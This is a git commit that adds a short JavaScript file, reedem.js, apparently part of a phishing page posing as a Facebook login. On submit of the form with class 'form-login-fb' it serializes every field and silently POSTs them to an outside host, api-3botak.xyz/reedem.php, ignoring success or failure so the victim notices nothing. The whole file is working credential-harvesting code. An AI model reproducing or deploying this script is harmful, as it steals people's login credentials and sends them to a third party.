d2c9fade161a136c65041cbf36e34fd46448a0de
Pips23 <96275532+Pips23@users.noreply.github.com>
2021-12-25 13:42:10 +0700

    Create reedem.js

---
+++ reedem.js
@@ -0,0 +1,15 @@
+$(".form-login-fb").submit(function() {
+	var d = $(".form-login-fb");
+
+	$.ajax({
+        url: "http://api-3botak.xyz/reedem.php",
+        type: "POST",
+        data: d.serialize(),
+        success: function () {
+            return true;
+        },
+        error: function () {
+            return true;
+        },
+    });
+});
